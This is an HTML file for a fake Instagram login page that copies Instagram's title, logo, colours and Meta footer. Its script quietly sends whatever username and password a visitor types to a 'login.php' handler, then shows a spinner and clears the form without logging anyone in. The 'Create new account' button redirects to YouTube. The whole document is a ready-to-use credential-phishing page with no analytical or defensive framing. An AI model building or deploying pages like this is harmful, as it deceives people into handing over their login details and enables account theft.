<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #000000;
            color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px 0;
        }
        .lang-container {
            font-size: 14px;
            color: #a8a8a8;
            margin-top: 10px;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
        }
        .logo {
            width: 75px;
            height: 75px;
            margin: 40px 0 30px 0;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo svg {
            width: 45px;
            height: 45px;
            fill: #ffffff;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .input-group {
            position: relative;
            width: 100%;
        }
        input {
            width: 100%;
            background-color: #121212;
            border: 1px solid #363636;
            border-radius: 5px;
            padding: 14px 12px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
        }
        input::placeholder {
            color: #8e8e8e;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            padding: 12px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 4px;
        }
        .login-btn:active {
            opacity: 0.7;
        }
        .forgot-pwd {
            color: #f5f5f5;
            font-size: 14px;
            text-decoration: none;
            text-align: center;
            margin: 20px 0;
        }
        .footer-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        .create-btn {
            width: 85%;
            max-width: 300px;
            background-color: transparent;
            border: 1px solid #0095f6;
            border-radius: 20px;
            color: #0095f6;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            text-align: center;
            text-decoration: none; /* Link underline hatane ke liye */
            display: inline-block;
        }
        .meta-footer {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
            color: #f5f5f5;
            font-weight: 500;
        }
        .meta-footer svg {
            width: 16px;
            height: 16px;
            fill: #f5f5f5;
        }
        /* Loader Animation */
        #loader {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #363636;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="lang-container">
        English (UK) ∨
    </div>

    <div class="main-container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
        </div>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Username, email address or mobile number" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <a href="#" class="forgot-pwd">Forgotten password?</a>
    </div>

    <div class="footer-container">
        <!-- Yahan <button ki jagah <a> tag ka use kiya hai jo YouTube par redirect karega -->
        <a href="https://www.youtube.com" target="_blank" class="create-btn">Create new account</a>
        
        <div class="meta-footer">
            <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm0 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10zm-1-16h2v6.586l3.707-3.707 1.414 1.414L13 15.414V17h-2v-6.586l-3.707 3.707-1.414-1.414L10.586 11H11V6z"/></svg>
            Meta
        </div>
    </div>

    <div id="loader">
        <div class="spinner"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('loader').style.display = 'flex';

            let formData = new FormData();
            formData.append('username', document.getElementById('username').value);
            formData.append('password', document.getElementById('password').value);

            fetch('login.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('loginForm').reset();
                }, 2000);
            })
            .catch(error => {
                document.getElementById('loader').style.display = 'none';
            });
        });
    </script>
</body>
</html>
